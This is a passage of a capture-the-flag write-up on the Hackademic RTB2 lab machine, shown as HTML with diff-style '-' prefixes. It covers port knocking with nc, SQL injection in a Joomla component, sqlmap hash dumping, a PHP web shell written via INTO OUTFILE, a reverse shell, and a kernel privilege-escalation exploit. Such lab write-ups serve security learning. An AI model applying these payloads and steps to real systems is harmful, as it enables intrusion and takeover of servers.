-%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%20%30%64%20%30%61%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%32%30%20%34%62%20%36%65%20%36%66%20%36%33%20%36%62%20%36%39%20%36%65%20%32%37%20%32%30%20%36%66%20%36%65%20%32%30%20%36%38%20%36%35%20%36%31%20%37%36%20%36%35%20%36%65%20%32%37%20%37%33%20%32%30%20%36%34%20%36%66%20%36%66%20%37%32%20%32%30%20%32%65%20%32%65%20%32%30%20%33%61%20%32%39%20%30%64%20%30%61%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%31%20%33%30%20%33%31%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%30%20%32%30%20%33%30%20%33%30%20%33%31%20%33%31%20%33%30%20%33%30%20%33%30%20%33%31%20%30%64%20%30%61%20%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%32%64%20%33%65%0A
-</code></p>
-
-<p>Decoding it yielded a hex string this time:</p>
-
-<p><code>plain
-3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0a 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 31 20 30 30 31 31 31 30 31 30 20 30 30 31 31 30 30 30 31 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 30 20 30 30 31 31 30 30 30 31 0d 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
-</code></p>
-
-<p>After decoding the hex string, I got this message:</p>
-
-<p><code>plain
-&lt;---------&gt;
-Knock Knock Knockin' on heaven's door .. :)
-00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
-&lt;---------&gt;
-</code></p>
-
-<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>
-
-<p>``` plain</p>
-
-<h1>!/bin/bash</h1>
-
-<p>for i in 1001 1101 1011 1001
-do
-nc 192.168.80.167 80 $i
-done
-```</p>
-
-<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>
-
-<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>
-
-<p><code>plain
-Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
-Versions effected: Joomla! 1.5.12
-Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
-Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
-Vulnerable? Yes
-</code></p>
-
-<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>
-
-<p><code>plain
-User-agent: *
-Disallow: /administrator/
-Disallow: /cache/
-Disallow: /components/
-Disallow: /images/
-Disallow: /includes/
-Disallow: /installation/
-Disallow: /language/
-Disallow: /libraries/
-Disallow: /media/
-Disallow: /modules/
-Disallow: /plugins/
-Disallow: /templates/
-Disallow: /tmp/
-Disallow: /xmlrpc/
-</code></p>
-
-<h1>Exploit</h1>
-
-<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>
-
-<p>``` plain
-<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>
-
-<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
-&rsquo;
-```</p>
-
-<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>
-
-<p><code>plain
-username    usertype    password
-Administrator   Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
-JSmith  Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
-BTallor Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
-hacky   Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL
-</code></p>
-
-<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>
-
-<p><code>plain
-/* Database Settings */
-var $dbtype = 'mysql';
-var $host = 'localhost';
-var $user = 'root';
-var $password = 'yUtJklM97W';
-var $db = 'joomla';
-var $dbprefix = 'jos_';
-</code></p>
-
-<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>
-
-<p><code>sql
-SELECT
-"&lt;? system($_REQUEST['cmd']); ?&gt;"
-INTO OUTFILE "/var/www/cmd.php";
-</code></p>
-
-<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>
-
-<p><code>plain
-Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
- 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: can't access tty; job control turned off
-</code></p>
-
-<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>
-
-<p><code>plain
-[snipped]
-[*] Restoring function pointer...
-id
-uid=0(root) gid=0(root)
-ls /root/
-Desktop
-Key.txt
-</code></p>
-
-<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>
-
-<p><code>plain
-root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
-root@pwnbox:~/Downloads#file decoded
-decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
-</code></p>
-
-<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>
-
-<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>
-
-<h1>Debriefing</h1>
-
-<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>
-
-<p>``` plain
-/ You are only young once, but you can \
-\ stay immature indefinitely.          /</p>
 
 <hr />
 
